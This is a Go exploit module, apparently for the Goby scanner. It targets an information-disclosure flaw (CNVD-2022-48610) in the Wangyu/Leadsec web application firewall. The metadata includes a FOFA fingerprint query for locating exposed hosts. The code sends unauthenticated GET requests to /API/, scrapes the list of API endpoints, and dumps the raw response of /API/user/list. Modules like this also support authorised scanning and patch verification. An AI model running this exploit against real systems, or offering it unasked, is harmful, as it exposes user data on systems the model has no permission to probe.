package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NetYu Web Application Security Protection System /API/ Information Disclosure Vulnerability(CNVD-2022-48610)",
    "Description": "<p>Wangyu Web Application Security Protection System (Wangyu WAF) is an application-layer security product based on Web security protection and application delivery developed by Wangyu Nebula.</p><p>There is an information leakage vulnerability in the web application security protection system of Beijing Wangyu Nebula Information Technology Co., Ltd., which can be exploited by attackers to obtain sensitive information.</p>",
    "Product": "leadsec-IPS",
    "Homepage": "https://www.leadsec.com.cn/",
    "DisclosureDate": "2022-10-29",
    "PostTime": "2024-07-11",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"网页防篡改系统\" && body=\"bower_components/requirejs/require.js\"",
    "GobyQuery": "title=\"网页防篡改系统\" && body=\"bower_components/requirejs/require.js\"",
    "Level": "0",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.leadsec.com.cn/\">https://www.leadsec.com.cn/</a></p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2023-1700365"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "all_API,user_list",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2022-48610"
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "网御Web应用安全防护系统 /API/ 信息泄露漏洞（CNVD-2022-48610）",
            "Product": "网御星云-入侵防护系统",
            "Description": "<p>网御Web应用安全防护系统，是网御星云公司所研制开发的基于Web 安全防护与应用交付类应用层安全产品。<br></p><p>北京网御星云信息技术公司网御Web应用安全防护系统存在信息泄露漏洞，攻击者通过访问特殊的Url获取部分敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.leadsec.com.cn/\">https://www.leadsec.com.cn/</a><br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "NetYu Web Application Security Protection System /API/ Information Disclosure Vulnerability(CNVD-2022-48610)",
            "Product": "leadsec-IPS",
            "Description": "<p>Wangyu Web Application Security Protection System (Wangyu WAF) is an application-layer security product based on Web security protection and application delivery developed by Wangyu Nebula.</p><p>There is an information leakage vulnerability in the web application security protection system of Beijing Wangyu Nebula Information Technology Co., Ltd., which can be exploited by attackers to obtain sensitive information.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.leadsec.com.cn/\">https://www.leadsec.com.cn/</a><br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10969"
}`
	sendPayload23421127882381 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		vulInfo := ``
		vulPath := `/API/`
		requestConfig := httpclient.NewGetRequestConfig("/API/")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 404 && strings.Contains(resp.RawBody, "user/list") {
				re := regexp.MustCompile(`<li>((.|\n)*?)<\/li>`)
				matches := re.FindAllStringSubmatch(resp.RawBody, -1)
				for _, match := range matches {
					cleanedMatch := strings.ReplaceAll(match[1], " ", "")     // 去除所有空格
					cleanedMatch = strings.ReplaceAll(cleanedMatch, "\n", "") // 去除所有换行符
					cleanedMatch = strings.ReplaceAll(cleanedMatch, "\t", "") // 去除所有制表符
					cleanedMatch = strings.ReplaceAll(cleanedMatch, "^", "")
					vulInfo += hostInfo.FixedHostInfo + "/API/" + cleanedMatch + "\n"
				}
				return true, vulInfo, vulPath
			}
		}
		return false, vulInfo, vulPath
	}
	sendPayload23483257238327834782 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		vulInfo := ``
		vulPath := `/API/user/list`
		requestConfig := httpclient.NewGetRequestConfig(vulPath)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "count") {
				vulInfo = resp.RawBody
				return true, vulInfo, vulPath
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, vulPath := sendPayload23421127882381(hostInfo)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.FixedHostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "all_API" {
				respBool, vulInfo, _ := sendPayload23421127882381(expResult.HostInfo)
				if respBool {
					expResult.Output = "The following interface is obtained:\n" + vulInfo
					expResult.Success = true
					return expResult
				}
			}
			if attacktype == "user_list" {
				respBool, vulInfo, _ := sendPayload23483257238327834782(expResult.HostInfo)
				if respBool {
					expResult.Output = vulInfo
					expResult.Success = true
					return expResult
				}
			}
			expResult.Success = false
			return expResult
		},
	))
}
